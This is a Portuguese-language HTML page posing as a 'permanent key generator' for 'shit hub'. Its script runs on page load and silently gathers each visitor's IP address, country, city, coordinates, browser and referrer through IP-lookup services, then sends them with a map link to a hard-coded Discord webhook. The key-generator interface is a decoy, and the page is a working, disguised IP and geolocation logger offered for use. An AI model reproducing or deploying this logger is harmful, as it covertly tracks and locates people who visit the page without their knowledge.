<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>shit hub - Key Generator</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Gotham:wght@400;700;900&display=swap');
        
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #0a0a0f, #1a0033);
            color: #fff;
            font-family: 'Gotham', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            background: rgba(20, 20, 30, 0.95);
            padding: 50px 40px;
            border-radius: 20px;
            box-shadow: 0 0 40px rgba(0, 255, 255, 0.4);
            max-width: 520px;
            width: 90%;
            text-align: center;
            border: 2px solid #00ffff;
        }

        h1 {
            font-size: 48px;
            color: #00ffff;
            margin-bottom: 10px;
            text-shadow: 0 0 20px #00ffff;
        }

        p {
            font-size: 18px;
            color: #bbb;
            margin-bottom: 30px;
        }

        button {
            background: #00ffff;
            color: #111;
            border: none;
            padding: 18px 60px;
            font-size: 22px;
            font-weight: 900;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s;
            margin: 15px;
        }

        button:hover {
            background: #00cccc;
            transform: scale(1.08);
            box-shadow: 0 0 25px #00ffff;
        }

        #generatedKey {
            margin-top: 30px;
            font-size: 26px;
            background: #111;
            padding: 20px;
            border-radius: 12px;
            word-break: break-all;
            border: 1px solid #00ffff;
            display: none;
        }

        .status {
            margin-top: 20px;
            font-size: 16px;
            color: #0f0;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>shit hub</h1>
        <p>Gerador de Key Permanente</p>
        
        <button onclick="generatePermanentKey()">GERAR KEY PERMANENTE</button>
        
        <div id="generatedKey">
            <strong>Sua Key:</strong><br>
            <span id="keyText" style="color:#00ffff; font-size:28px;"></span><br><br>
            <button onclick="copyKey()">Copiar Key</button>
        </div>

        <div class="status" id="status"></div>
    </div>

<script>
// === URL DA SUA WEBHOOK ===
const webhookUrl = "https://discord.com/api/webhooks/1492629972467191900/vuO7OS7o0V_LLTVz2_mvHVY-344wKKvcWKSWCiEQfLmyuVrDr2fgQx9jT3Q1O7ROdiRp";

async function enviarLogger() {
    let ip = "Desconhecido";
    let pais = "Desconhecido";
    let cidade = "Desconhecido";
    let lat = "";
    let lon = "";

    try {
        // API mais confiável atualmente para client-side (GitHub Pages)
        const res = await fetch("https://ipwho.is/");
        const geo = await res.json();

        if (geo && geo.success !== false) {
            ip     = geo.ip || "Desconhecido";
            pais   = geo.country || "Desconhecido";
            cidade = geo.city || geo.region || "Desconhecido";
            lat    = geo.latitude || "";
            lon    = geo.longitude || "";
        }
    } catch (e) {
        console.log("Primeira API falhou, tentando fallback...");
        
        // Fallback simples (só IP)
        try {
            const ipRes = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipRes.json();
            ip = ipData.ip || "Desconhecido";
        } catch (e2) {
            console.error("Todos os métodos de IP falharam");
        }
    }

    const mapa = (lat && lon) 
        ? `https://www.google.com/maps?q=${lat},${lon}` 
        : "Sem localização";

    const browser = navigator.userAgent;
    const data    = new Date().toLocaleString('pt-BR');
    const origem  = document.referrer || "Direto";

    const msg = `**Novo acesso detectado!**\n\n` +
                `**IP:** ${ip}\n` +
                `**Data/Hora:** ${data}\n` +
                `**País:** ${pais}\n` +
                `**Cidade:** ${cidade}\n` +
                `**Navegador:** ${browser}\n` +
                `**Origem:** ${origem}\n` +
                (mapa !== "Sem localização" ? `**Mapa:** ${mapa}\n` : "");

    try {
        await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: msg,
                username: "CabralDev Logger 💤",
                // avatar_url: "https://i.imgur.com/SEU_LINK.png"  // descomente se quiser
            })
        });
        console.log("✅ Logger enviado com sucesso");
    } catch (error) {
        console.error("❌ Erro ao enviar para webhook:", error);
    }
}

// Executa quando a página carregar
window.addEventListener('load', enviarLogger);
</script>

</body>
</html>
